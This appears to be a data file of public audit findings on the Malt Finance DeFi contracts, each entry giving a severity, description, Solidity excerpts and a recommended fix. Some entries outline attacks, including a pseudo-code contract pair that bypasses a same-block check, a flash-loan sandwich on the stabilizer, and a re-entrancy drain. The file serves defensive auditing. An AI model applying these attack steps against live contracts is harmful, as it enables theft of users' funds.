To do that, the current governor can call `Timelock#setGovernor(address _governor)` and set a new `governor` effective immediately.

And the new `governor` can then call `Timelock#setDelay()` and change the delay to `0`, also effective immediately.

The new `governor` can now use all the privileges without a delay, including granting minter role to any address and mint unlimited amount of MALT.

In conclusion, a Timelock contract is supposed to guard the protocol from lost private key or malicious actions. The current implementation won't fulfill that mission.

<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Timelock.sol#L98-L105>

```solidity
  function setGovernor(address _governor)
    public
    onlyRole(GOVERNOR_ROLE, ""Must have timelock role"")
  {
    _swapRole(_governor, governor, GOVERNOR_ROLE);
    governor = _governor;
    emit NewGovernor(_governor);
  }
```

<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Timelock.sol#L66-L77>

```solidity
  function setDelay(uint256 _delay)
    public
    onlyRole(GOVERNOR_ROLE, ""Must have timelock role"")
  {
    require(
      _delay >= 0 && _delay < gracePeriod,
      ""Timelock::setDelay: Delay must not be greater equal to zero and less than gracePeriod""
    );
    delay = _delay;

    emit NewDelay(delay);
  }
```

#### Recommendation

Consider making `setGovernor` and `setDelay` only callable from the Timelock contract itself.

Specificaly, changing from `onlyRole(GOVERNOR_ROLE, ""Must have timelock role"")` to `require(msg.sender == address(this), ""..."")`.

Also, consider changing `_adminSetup(_admin)` in `Timelock#initialize()` to `_adminSetup(address(this))`, so that all roles are managed by the timelock itself as well."
59.md,Unable to remove liquidity in Recovery Mode,high,"According to <https://github.com/code-423n4/2021-11-malt#high-level-overview-of-the-malt-protocol>

> When the Malt price TWAP drops below a specified threshold (eg 2% below peg) then the protocol will revert any transaction that tries to remove Malt from the AMM pool (ie buying Malt or removing liquidity). Users wanting to remove liquidity can still do so via the UniswapHandler contract that is whitelisted in recovery mode.

However, in <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/DexHandlers/UniswapHandler.sol#L236>
liquidity removed is directly sent to msg.sender, which would revert if it is not whitelisted
<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/PoolTransferVerification.sol#L53>

#### Recommended Mitigation Steps

Liquidity should be removed to UniswapHandler contract, then the proceed is sent to msg.sender"
59.md,getAuctionCore function returns wrong values out of order,high,"#### Impact

In the `AuctionEscapeHatch.sol` file both `earlyExitReturn()` and `\_calculateMaltRequiredForExit` call the `getAuctionCore()` function which has 10 possible return values most of which are not used.  It gets the wrong value back for the ""active""  variable since it's the 10th argument but both functions have it as the 9th return value where ""preAuctionReserveRatio"" should be because of one missing comma.  This is serious because these both are functions which deal with allowing a user to exit their arbitrage token position early.  This can result in a loss of user funds.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/AuctionEscapeHatch.sol#L100>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/AuctionEscapeHatch.sol#L174>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L527>

#### Tools Used

Manual code review

#### Recommended Mitigation Steps

In `AuctionEscapeHatch.sol` change the following in `\_calculateMaltRequiredForExit()` and earlyExitReturn() functions:

From:

(,,,,,
uint256 pegPrice,
,
uint256 auctionEndTime,
bool active
) = auction.getAuctionCore(\_auctionId);

To:

(,,,,,
uint256 pegPrice,
,
uint256 auctionEndTime,
,
bool active
) = auction.getAuctionCore(\_auctionId);"
59.md,`AuctionBurnReserveSkew.getPegDeltaFrequency()` Wrong implementation can result in an improper amount of excess Liquidity Extension balance to be used at the end of an auction,high,"<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/AuctionBurnReserveSkew.sol#L116-L132>

```solidity
  function getPegDeltaFrequency() public view returns (uint256) {
    uint256 initialIndex = 0;
    uint256 index;

    if (count > auctionAverageLookback) {
      initialIndex = count - auctionAverageLookback;
    }

    uint256 total = 0;

    for (uint256 i = initialIndex; i < count; ++i) {
      index = _getIndexOfObservation(i);
      total = total + pegObservations[index];
    }

    return total * 10000 / auctionAverageLookback;
  }
```

When `count < auctionAverageLookback`, at L131, it should be `return total * 10000 / count;`. The current implementation will return a smaller value than expected.

The result of `getPegDeltaFrequency()` will be used for calculating `realBurnBudget` for auctions. With the result of `getPegDeltaFrequency()` being inaccurate, can result in an improper amount of excess Liquidity Extension balance to be used at the end of an auction."
59.md,AuctionEschapeHatch.sol#exitEarly updates state of the auction wrongly,high,"`AuctionEschapeHatch.sol#exitEarly` takes as input `amount` to represent how much of the

When the user exits an auction with profit, to apply the profit penalty less `maltQuantity` is liquidated compared to how much malt token the liquidated amount corresponds to. The problem is `auction.amendAccountParticipation()` simply subtracts the malt quantity with penalty and full `amount` from users auction stats. This causes a major problem, since in `_calculateMaltRequiredForExit` those values are used for calculation by calculating maltQuantity as follow:

`uint256 maltQuantity = userMaltPurchased.mul(amount).div(userCommitment);`

The ratio of `userMaltPurchased / userCommitment` gets higher after each profit taking (since penalty is applied to substracted `maltQuantity` from `userMaltPurchased`), by doing so a user can earn more than it should. Since after each profit taking users commitment corresponds to proportionally more malt, the user can even reduce profit penalties by dividing `exitEarly` calls in several calls.

In other words, the ratio of `userMaltPurchased / userCommitment` gets higher after each profit taking and user can claim more malt with less commitment. Furthermore after all `userMaltPurchased` is claimed the user can have `userCommitment` left over, which can be used to `claimArbitrage`, when possible.

#### Mitigation Step

Make sure which values are used for what and update values which doesn't create problems like this. Rethink about how to track values of an auction correctly."
59.md,TIMELOCK_ROLE Has Absolute Power to Withdraw All FUND May Raise Red Flags for Investors,medium,"`TIMELOCK_ROLE` Can Withdraw All FUND from the Contracts via `emergencyWithdrawGAS(), emergencyWithdraw(), partialWithdrawGAS(), partialWithdraw()`.

While I believe developer have good intention to use these functions. It often associate with Rug Pull by developer in the eyes of investors because Rug Pull is not uncommon in Defi. Investors lose all their hard earn money.

Read More: \$10.8M Stolen, Developers Implicated in Alleged Smart Contract 'Rug Pull'
<https://www.coindesk.com/tech/2020/12/02/108m-stolen-developers-implicated-in-alleged-smart-contract-rug-pull/>

Read More: The Rise of Cryptocurrency Exit Scams and DeFi Rug Pulls
<https://www.cylynx.io/blog/the-rise-of-cryptocurrency-exit-scams-and-defi-rug-pulls/>

#### Proof of Concept

<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Permissions.sol#L80-L109>

#### Recommended Mitigation Steps

1.  Pause the Contract and Disable All Functions when Bad Thing Happen rather than Withdraw All Fund to a random address.
2.  If Withdraw Fund can't avoid, a Multi Sig ETH Address should be hardcoded into the contract to ensure the fund move to a safe wallet."
59.md,Frontrunning in UniswapHandler calls to UniswapV2Router,medium,"you, also found by 0x0x0x, cmichel, defsec, harleythedog, hyh, Koustre, leastwood, Meta0xNull, pauliax, pmerkleplant, tabish, WatchPug, and xYrYuYx_


UniswapHandler utilizes UniswapV2Router to swap, add liquidity, and remove liquidity with the UniswapV2Pair contract. In order to utilize these functionalities, UniswapHandler must call various UniswapV2Router methods.

*   addLiquidity
*   removeLiquidity
*   swapExactTokensForTokens (swaps for both DAI and Malt)

In all three methods, UniswapV2Router requires the callee to provide input arguments that define how much the amount out minimum UniswapHandler will allow for a trade. This argument is designed to prevent slippage and more importantly, sandwich attacks.

UniswapHandler correctly handles price slippage when calling [addLiquidity](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L201). However, that is not the case for [removeLiquidity](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L230) and swapExactTokensForTokens [here](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L148) and [here](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L173). For both methods, 0 is passed in as the amount out minimum allowed for a trade. This allows for anyone watching the mempool to sandwich attack UniswapHandler (or any contract that calls UniswapHandler) in such a way that allows the hacker to profit off of a guaranteed trade.

How does this work? Let's assume UniswapHandler makes a call to [UniswapV2Router#swapExactTokensForTokens](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L148) to trade DAI for Malt. Any hacker who watches the mempool and sees this transaction can immediately buy as much Malt as they want. This raises the price of Malt. Since UniswapHandler is willing to accept any amount out minimum (the number is set to [zero](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L150)), then the UniswapHandler will always trade DAI for Malt. This second transaction raises the price of Malt even further. Finally, the hacker trades their Malt for DAI, receiving a profit due to the artificially inflated price of Malt from the sandwich attack.

It's important to note that anyone has access to the UniswapV2Router contract. There are no known ACL controls on UniswapV2Router. This sandwich attack can impact even the `buyMalt` function.

The following functions when called are vulnerable to frontrunning attacks:

*   [UniswapHandler#buyMalt](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L131)
*   [UniswapHandler#sellMalt](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L160)
*   [UniswapHandler#removeLiquidity](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/DexHandlers/UniswapHandler.sol#L221)

And by extension the following contract functions since they also call the UniswapHandler function calls:

*   [Bonding#unbondAndBreak](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Bonding.sol#L114)
*   [LiquidityExtension#purchaseAndBurn](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/LiquidityExtension.sol#L117)
*   [RewardReinvestor#splitReinvest](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/RewardReinvestor.sol#L78)
*   [StabilizerNode#stabilize](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/StabilizerNode.sol#L145)
*   [SwingTrader#buyMalt](https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/SwingTrader.sol#L50)

#### Proof of Concept

Refer to the impact section for affected code and links to the appropriate LoC.

#### Recommended Mitigation Steps

The UniswapV2Router and UniswapV2Pair contract should allow only the UniswapHandler contract to call either contract. In addition, price slippage checks should be implemented whenever removing liquidity or swapping tokens. This ensures that a frontrunning attack can't occur.

#### Anything Else We Should Know

I wish I had more time to work on this bug but unfortunately I have several current clients who require significant time from me. I'm happy to pursue this beyond the initial submission, in particular building a concrete PoC. I think the most important takeaway from this bug find is that anyone can purchase Malt at any time and anyone can manipulate the Malt reserve. This in turn impacts other functionalities that rely on the Malt reserve to make price/token calculations such as exiting an auction early or reinvesting rewards."
59.md,AbstractRewardMine.sol#setRewardToken is dangerous,medium,"In case the reward token is changed, `totalDeclaredReward` will be changed and likely equal to `0`.  Since `_userStakePadding` and `_globalStakePadding` are accumulated, changing the reward token will not reset those values. Thus, it will create problems.

#### Recommendation

I think it would be the best to remove this function.

If you want to keep it, then it must have an event and it should be used by a timelock contract. Furthermore, it has to be used carefully and the new token should be distributed such that padding variables still make sense."
59.md,The Power Structure is Too Centralized And Protocol May Break If Anything Happen to Admin,medium,"There are a lot of different roles in Malt Finance to handle different tasks. All these roles only can set by Admin. If anything happen to Admin and he/she no longer available, the protocol will start countdown to the end of life.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L890-L1013>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/RewardSystem/RewardDistributor.sol#L291-L345>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Bonding.sol#L327-L355>
Many More Sol....

#### Recommended Mitigation Steps

1.  Some tasks don't really need a special role like StabilizerNode. Should allow any community members to run their own StabilizerNode without approval needed.
2.  Consider transfer Admin to Multisig or DAO."
59.md,_notSameBlock() can be circumvented in bondToAccount(),medium,"The function bondToAccount() of Bonding.sol has a check based on \_notSameBlock()
\_notSameBlock() makes sure the same msg.sender cannot do 2 actions within the same block.

However this can be circumvented in this case:
Suppose you call bondToAccount() via a (custom) smart contract, then the msg.sender will be the address of the smart contract.
For a pseudo code proof of concept see below.

I'm not sure what the deeper reason is for the \_notSameBlock() in bondToAccount().
But if it is important then circumventing this check it will pose a risk.

#### Proof of Concept

call function attack1.attack()

```JS
contract attack1 {
   function attack(address account, uint256 amount) {
         call attack2.forward(account, amount);
         call any other function of malt
  }
}

contract attack2 {
   function forward(address account, uint256 amount) {
       call bonding.bondToAccount(account, amount); // uses msg.sender of attack2
   }
}
```

<https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/Bonding.sol#L81-L92>

```JS
function bondToAccount(address account, uint256 amount) public {
    if (msg.sender != offering) {
         _notSameBlock();
    }
    ...
```

<https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/Permissions.sol#L135-L141>

```JS
function _notSameBlock() internal {
    require( block.number > lastBlock[_msgSender()],""Can't carry out actions in the same block"" );
    lastBlock[_msgSender()] = block.number;
  }
```

#### Recommended Mitigation Steps

Add access controls to the function bondToAccount()
An end-user could still call bond()"
59.md,AbstractRewardMine - Re-entrancy attack during withdrawal,medium,"The internal `_withdraw` method does not follow the checks-effects-interactions pattern. A malicious token, or one that implemented transfer hooks, could re-enter the public calling function (such as `withdraw()`) before proper internal accounting was completed. Because the `earned` function looks up the `_userWithdrawn` mapping, which is not yet updated when the transfer occurs, it would be possible for a malicious contract to re-enter `_withdraw` repeatedly and drain the pool.

#### Recommended Mitigation Steps

The internal accounting should be done before the transfer occurs:

```solidity
function _withdraw(address account, uint256 amountReward, address to) internal {
    _userWithdrawn[account] += amountReward;
    _globalWithdrawn += amountReward;f

   rewardToken.safeTransfer(to, amountReward);

    emit Withdraw(account, amountReward, to);
  }
```"
59.md,"`MovingAverage.setSampleMemory()` may broke MovingAverage, making the value of `exchangeRate` in `StabilizerNode.stabilize()` being extremely wrong",medium,"<https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/MovingAverage.sol#L424-L442>

```solidity
function setSampleMemory(uint256 _sampleMemory)
  external
  onlyRole(ADMIN_ROLE, ""Must have admin privs"")
{
  require(_sampleMemory > 0, ""Cannot have sample memroy of 0"");

  if (_sampleMemory > sampleMemory) {
    for (uint i = sampleMemory; i < _sampleMemory; i++) {
      samples.push();
    }
    counter = counter % _sampleMemory;
  } else {
    activeSamples = _sampleMemory;

    // TODO handle when list is smaller Tue 21 Sep 2021 22:29:41 BST
  }

  sampleMemory = _sampleMemory;
}
```

In the current implementation, when `sampleMemory` is updated, the samples index will be malposition, making `getValueWithLookback()` get the wrong samples, so that returns the wrong value.

#### Proof of Concept

*   When initial sampleMemory is `10`
*   After `movingAverage.update(1e18)` being called for 120 times
*   The admin calls `movingAverage.setSampleMemory(118)` and set sampleMemory to `118`

The current `movingAverage.getValueWithLookback(sampleLength * 10)` returns `0.00000203312 e18`, while it's expeceted to be `1e18`

After `setSampleMemory()`, `getValueWithLookback()` may also return `0`or revert FullMath: FULLDIV_OVERFLOW at L134.

##### Recommendation

Consider removing `setSampleMemory` function."
59.md,`_getFirstSample` returns wrong sample if count < sampleMemory,medium,"The `MovingAverage.sol` contract defines several variables that in the end make the `samples` array act as a ring buffer:

*   `sampleMemory`: The total length (buffer size) of the `samples` array. `samples` is initialized with `sampleMemory` zero observations.
*   `counter`: The pending sample index (modulo `sampleMemory`)

The `_getFirstSample` function computes the first sample as `(counter + 1) % sampleMemory` which returns the correct index only *if the ring buffer is full*, i.e., it wraps around. (in the `counter + 1 >= sampleMemory`).

If the `samples` array does not wrap around yet, the zero index should be returned instead.

#### Impact

Returning `counter + 1` if `counter + 1 < sampleMemory` returns a zero initialized `samples` observation index.
This then leads to a wrong computation of the TWAP.

#### Recommended Mitigation Steps

Add an additional check for `if (counter + 1 < sampleMemory) return 0` in `_getFirstSample`."
59.md,`UniswapHandler.maltMarketPrice` returns wrong decimals,medium,"The `UniswapHandler.maltMarketPrice` function returns a tuple of the `price` and the `decimals` of the price.
However, the returned `decimals` do not match the computed `price` for the `else if (rewardDecimals < maltDecimals)` branch:

```solidity
else if (rewardDecimals < maltDecimals) {
  uint256 diff = maltDecimals - rewardDecimals;
  price = (rewardReserves.mul(10**diff)).mul(10**rewardDecimals).div(maltReserves);
  decimals = maltDecimals;
}
```

Note that `rewardReserves` are in reward token decimals, `maltReserves` is a malt balance amount (18 decimals).
Then, the returned amount is in `rewardDecimals + diffDecimals + rewardDecimals - maltDecimals = maltDecimals + rewardDecimals - maltDecimals = rewardDecimals`.
However `decimals = maltDecimals` is wrongly returned.

#### Impact

Callers to this function will receive a price in unexpected decimals and might inflate or deflate the actual amount.
Luckily, the `AuctionEscapeHatch` decides to completely ignore the returned `decimals` and as all prices are effectively in `rewardDecimals`, even if stated in `maltDecimals`, it currently does not seem to lead to an issue.

#### Recommendation

Fix the function by returning `rewardDecimals` instead of `maltDecimals` in the `rewardDecimals < maltDecimals` branch."
59.md,AuctionParticipant.sol: `setReplenishingIndex` mistake could freeze unclaimed tokens,medium,"In AuctionParticipant.sol, the function `setReplenishingIndex` is an admin function that allows manually setting `replenishingIndex`. As I have shown in my two previous findings, I believe that this function could be called frequently. In my opinion (and Murphy's law would agree), this implies that eventually an admin will accidentally set `replenishingIndex` incorrectly with this function.

Right now, `setReplenishingIndex` does not allow the admin to set `replenishingIndex` to a value smaller than it currently is. So, if an admin were to accidentally set this value too high, then it would be impossible to set it back to a lower value (the higher the value set, the worse this issue). All of the unclaimed tokens on auctions at smaller indices would be locked forever.

#### Proof of Concept

See code for `setReplenishingIndex` here: <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/AuctionParticipant.sol#L132>


#### Recommended Mitigation Steps

Remove the require statement on line 136, so that an admin can set the index to a smaller value."
59.md,No max for advanceIncentive,medium,"The function setAdvanceIncentive of DAO.sol doesn't check for a maximum value of incentive.
If incentivewould be very large, then advanceIncentive would be very large and the function advance() would mint a large amount of malt.

The function setAdvanceIncentive() can only be called by an admin, but a mistake could be made.
Also if an admin would want to do a rug pull, this would be an ideal place to do it.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L98-L104>

```js
function setAdvanceIncentive(uint256 incentive)  externalonlyRole(ADMIN_ROLE, ""Must have admin role"") {
  ...
  advanceIncentive = incentive;
```

<https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L55-L63>

```js
function advance() external {
...
  malt.mint(msg.sender, advanceIncentive * 1e18);

```

#### Recommended Mitigation Steps

Check for a reasonable maximum value in advance()"
59.md,Permissions - return values not checked when sending ETH,medium,"On lines 85 and 101, ETH is transferred using a `.call` to an address provided as an input, but there is no verification that the call call succeeded. This can result in a call to `emergencyWithdrawGAS` or `partialWithdrawGAS` appearing successful but in reality it failed. This can happen when the provided `destination` address is a contract that cannot receive ETH, or if the `amount` provided is larger than the contract's balance

#### Proof of Concept

Enter the following in remix, deploy the `Receiver` contract, and send 1 ETH when deploying the `Permissions` contract. Call `emergencyWithdrawGAS` with the receiver address and you'll see it reverts. This would not be caught in the current code

```solidity
pragma solidity ^0.8.0;

contract Receivier{}

contract Permissions {
  constructor() payable {}

  function emergencyWithdrawGAS(address payable destination) external {
    (bool ok, ) = destination.call{value: address(this).balance}('');
    require(ok, ""call failed"");
  }
}
```

#### Tools Used

Remix

#### Recommended Mitigation Steps

In `emergencyWithdrawGAS`:

```diff
- destination.call{value: address(this).balance}('');
+ (bool ok, ) = destination.call{value: address(this).balance}('');
+ require(ok, ""call failed"");
```

And similar for `partialWithdrawGAS`"
59.md,Reducing the epoch length results in leaking value from advancement incentives,medium,"Unintended advancement incentives being paid out to third party

#### Proof of Concept

`DAO.sol` incentives outside parties to advance the epoch by minting 100 MALT tokens for calling the `advance` function. This is limited by checking that the start timestamp of the next epoch has passed.

<https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L55-L63>

This start timestamp is calculated by multiplying the new epoch number by the length of an epoch and adding it to the genesis timestamp.

<https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L65-L67>

This method makes no accommodation for the fact that previous epochs may have been set to be a different length to what they are currently.

<https://github.com/code-423n4/2021-11-malt/blob/d3f6a57ba6694b47389b16d9d0a36a956c5e6a94/src/contracts/DAO.sol#L111-L114>

In the case where the epoch length is reduced, `DAO` will think that the epoch number can be incremented potentially many times. Provided the `advanceIncentive` is worth more than the gas necessary to advance the epoch will be rapidly advanced potentially many times paying out unnecessary incentives.

#### Recommended Mitigation Steps

Rather than calculating from the genesis timestamp, store the last time that the epoch length was modified and calculate from there."
59.md,Wrong permissions on `reassignGlobalAdmin`,medium,"The `Permissions.reassignGlobalAdmin` function is supposed to only be run with the `TIMELOCK_ROLE` role, see `onlyRole(TIMELOCK_ROLE, ""Only timelock can assign roles"")`.

However, the `TIMELOCK_ROLE` is not the admin of all the reassigned roles and the `revokeRole(role, oldAccount)` calls will fail as it requires the `ADMIN_ROLE`.

#### Recommended Mitigation Steps

The idea might have been that only the `TIMELOCK` should be able to call this function, and usually it is also an admin, but the function strictly does not work if the caller *only* has the `TIMELOCK` roll and will revert in this case.
Maybe governance decided to remove the admin role from the Timelock, which makes it impossible to call `reassignGlobalAdmin` anymore as both the timelock and admin are locked out."
59.md,Bonding doesn't work with fee-on transfer tokens,medium,"Certain ERC20 tokens make modifications to their ERC20's `transfer` or `balanceOf` functions.
One type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.

#### Impact

The `Bonding._bond()` function will revert in the `_balanceCheck` when transferring a fee-on-transfer token as it assumes the entire `amount` was received.

#### Recommended Mitigation Steps

To support fee-on-transfer tokens, measure the asset change right before and after the asset-transferring calls and use the difference as the actual bonded amount."
59.md,theft of system profit,medium,"System profit comes from the stabilize function when the price of malt is above 1. Therefore it should not be allowed for anyone to take a part of the system profit when the price is above one. Right now, anyone can take a part of the investors' profits, even if they don't own any malt at all.

#### Proof of Concept

suppose that the price went up to 1.2 dai; the investors should get the reward for this rise. instead, anyone can take a part of the reward in the following steps:
The price of malt is now 1.2 dai.
Take a flash loan of a large amount of malt.
Sell the malt for dai.
Now the price went down to 1.1 dai because of the enormous swap.
Call stabilize in order to lower the price to 1 dai.
Buy malt to repay the flash loan at a lower cost with the bought dai.
Repay the flash loan, and take the profit.

It is a sandwich attack because they sold malt for a high price, then they called stabilize to lower the value, then repurchase it for a low price.

The user made a profit at the expense of the investors.

If a user already has malt, it’s even easier:
just sell all malt at a high cost.

#### Recommended Mitigation Steps

in \_beforeTokenTransfer, if the price is above 1\$ and the receiver is the AMM pool, stabilize it."
59.md,Auction collateralToken won't work if token is fee-on-transfer token,medium,"There are several ERC20 tokens that take a small fee on transfers/transferFroms (known as ""fee-on-transfer"" tokens). Most notably, USDT is an ERC20 token that has togglable transfer fees, but for now the fee is set to 0 (see the contract here: <https://etherscan.io/address/0xdAC17F958D2ee523a2206206994597C13D831ec7#code>). For these tokens, it should not be assumed that if you transfer `x` tokens to an address, that the address actually receives `x` tokens. In the current test environment, DAI is the only `collateralToken` available, so there are no issues. However, it has been noted that more pools will be added in the future, so special care will need to be taken if fee-on-transfer tokens (like USDT) are planned to be used as `collateralTokens`.

For example, consider the function `purchaseArbitrageTokens` in Auction.sol. This function transfers `realCommitment` amount of `collateralToken` to the liquidityExtension, and then calls `purchaseAndBurn(realCommitment)` on the liquidityExtension. The very first line of `purchaseAndBurn(amount)` is `require(collateralToken.balanceOf(address(this)) >= amount, ""Insufficient balance"");`. In the case of fee-on-transfer tokens, this line will revert due to the small fee taken. This means that all calls to `purchaseArbitrageTokens` will fail, which would be very bad when the price goes below peg, since no one would be able to participate in this auction.

#### Proof of Concept

See `purchaseArbitrageTokens` here: <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/Auction.sol#L177>

See `purchaseAndBurn` here: <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/LiquidityExtension.sol#L117>


#### Recommended Mitigation Steps

Add logic to transfers/transferFroms to calculate exactly how many tokens were actually sent to a specific address. In the example given with `purchaseArbitrageTokens`, instead of calling `purchaseAndBurn` with `realCommitment`, the contract should use the difference in the liquidityExtension balance after the transfer minus the liquidityExtension  balance before the transfer."
59.md,AuctionParticipant.sol: `purchaseArbitrageTokens` should not push duplicate auctions,medium,"In AuctionParticpant.sol, every time `purchaseArbitrageTokens` is called, the current auction is pushed to `auctionIds`. If this function were to be called on the same auction multiple times, then the same auction id would be pushed multiple times into this array, and the `claim` function would have issues with `replenishingIndex`.

Specifically, even if `replenishingIndex` was incremented once in `claim`, it is still possible that the auction at the next index will never reward any more tokens to the participant, so the contract would need manual intervention to set `replenishingIndex` (due to the if statement on lines 79-82 that does nothing if there is no claimable yield).

It is likely that `purchaseArbitrageTokens` would be called multiple times on the same auction. In fact, the commented out code for `handleDeficit` (in ImpliedCollateralService.sol) even suggests that the purchases might happen within the same transaction. So this issue will likely be an issue on most auctions and would require manual setting of `replenishingIndex`.

NOTE: This is a separate issue from the one I just submitted previously relating to `replenishingIndex`. The previous issue was related to an edge case where `replenishingIndex` might need to be incremented by one if there are never going to be more claims, while this issue is due to duplicate auction ids.

#### Proof of Concept

See code for `purchaseArbitrageTokens` here: <https://github.com/code-423n4/2021-11-malt/blob/c3a204a2c0f7c653c6c2dda9f4563fd1dc1cecf3/src/contracts/AuctionParticipant.sol#L40>

Notice that `currentAuction` is always appended to `auctionIds`.


#### Recommended Mitigation Steps

Add a check to the function to `purchaseArbitrageTokens` to ensure that duplicate ids are not added. For example, this can be achieved by changing auctionIds to a mapping instead of an array."
59.md,MiningService.setBonding should use BONDING role instead of REINVESTOR one,medium,"BONDING_ROLE cannot be managed after it was initialized.

#### Proof of Concept

`setBonding` set the wrong role via \_swapRole:

<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/MiningService.sol#L116>

#### Recommended Mitigation Steps

Set `BONDING_ROLE` instead of `REINVESTOR_ROLE` in `setBonding` function:

Now:
```solidity
function setBonding(address _bonding)
  public
  onlyRole(ADMIN_ROLE, ""Must have admin privs"")
{
  require(_bonding != address(0), ""Cannot use address 0"");
  _swapRole(_bonding, bonding, REINVESTOR_ROLE);
  bonding = _bonding;
}
```

To be:
```solidity
function setBonding(address _bonding)
  public
  onlyRole(ADMIN_ROLE, ""Must have admin privs"")
{
  require(_bonding != address(0), ""Cannot use address 0"");
  _swapRole(_bonding, bonding, BONDING_ROLE);
  bonding = _bonding;
}
```"
59.md,Users Can Contribute To An Auction Without Directly Committing Collateral Tokens,medium,"`purchaseArbitrageTokens` enables users to commit collateral tokens and in return receive arbitrage tokens which are redeemable in the future for Malt tokens. Each auction specifies a commitment cap which when reached, prevents users from participating in the auction. However, `realCommitment` can be ignored by directly sending the `LiquidityExtension` contract collateral tokens and subsequently calling `purchaseArbitrageTokens`.

#### Proof of Concept

Consider the following scenario:

*   An auction is currently active.
*   A user sends collateral tokens to the `LiquidityExtension` contract.
*   The same user calls `purchaseArbitrageTokens` with amount `0`.
*   The `purchaseAndBurn` call returns a positive `purchased` amount which is subsequently used in auction calculations.

As a result, a user could effectively influence the average malt price used throughout the `Auction` contract.

<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L177-L214>
<https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/LiquidityExtension.sol#L117-L128>

#### Recommended Mitigation Steps

Consider adding a check to ensure that `realCommitment != 0` in `purchaseArbitrageTokens`."
59.md,`StabilizerNode` Will Mint An Incentive For Triggering An Auction Even If An Auction Exists Already,medium,"`_startAuction` utilises the `SwingTrader` contract to purchase Malt. If `SwingTrader` has insufficient capital to return the price of Malt back to its target price, an auction is triggered with the remaining amount. However, no auction is triggered if the current auction exists, but `msg.sender` is still rewarded for their call to `stabilize`.

#### Proof of Concept

`_shouldAdjustSupply` initially checks if the current auction is active, however, it does not check if the current auction exists. There is a key distinction between the `auctionActive` and `auctionExists` functions which are not used consistently. Hence, an auction which is inactive but exists would satisfy the edge case and result in `triggerAuction` simply returning.

- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L382-L386>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L268-L272>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/StabilizerNode.sol#L342-L344>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/Auction.sol#L873-L888>


#### Recommended Mitigation Steps

Consider using `auctionExists` and `auctionActive` consistently in `StabilizerNode` and `Auction` to ensure this edge case cannot be abused."
59.md,`_calculateMaltRequiredForExit` Uses Spot Price To Calculate Malt Quantity In `exitEarly`,medium,"`_calculateMaltRequiredForExit` in `AuctionEscapeHatch` currently uses Malt's spot price to calculate the quantity to return to the exiting user. This spot price simply tracks the Uniswap pool's reserves which can easily be manipulated via a flash loan attack to extract funds from the protocol.

#### Proof of Concept

- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/AuctionEscapeHatch.sol#L65-L92>
- <https://github.com/code-423n4/2021-11-malt/blob/main/src/contracts/AuctionEscapeHatch.sol#L193>
